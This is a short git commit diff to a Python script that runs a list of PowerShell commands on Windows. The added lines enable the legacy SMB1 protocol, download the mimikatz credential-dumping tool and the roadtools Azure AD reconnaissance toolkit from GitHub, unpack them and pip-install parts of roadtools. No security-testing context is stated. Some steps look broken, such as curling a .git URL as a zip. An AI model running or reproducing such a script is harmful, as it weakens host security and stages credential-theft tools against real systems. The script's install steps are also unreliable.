f584ba2846c4f8a74d6044346a6c62890105186e
unknown <vuthai010705@gmail.com>
2026-06-02 22:09:20 +0700

    dcmmmmm

--- code.py
+++ code.py
@@ -1,9 +1,15 @@
 import subprocess
 
 COMMANDS = [
+    r'Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart',
     r'mkdir C:\hello',
     r'curl.exe -L https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -o C:\hello\hello.zip',
-    r'Expand-Archive -Path "C:/hello/hello.zip" -DestinationPath "C:/hello/unzipped"',
+    r'curl.exe -L https://github.com/dirkjanm/roadtools.git -o C:\hello\roadtools.zip',
+    r'Expand-Archive -Path "C:/hello/roadtools.zip" -DestinationPath "C:/hello/road"',
+    r'Expand-Archive -Path "C:/hello/hello.zip" -DestinationPath "C:/hello/hello"',
+    r'pip install roadlib/',
+    r'pip install roadtx/',
+    r'pip install roadrecon/',
 ]
 
 def run_powershell(command: str):
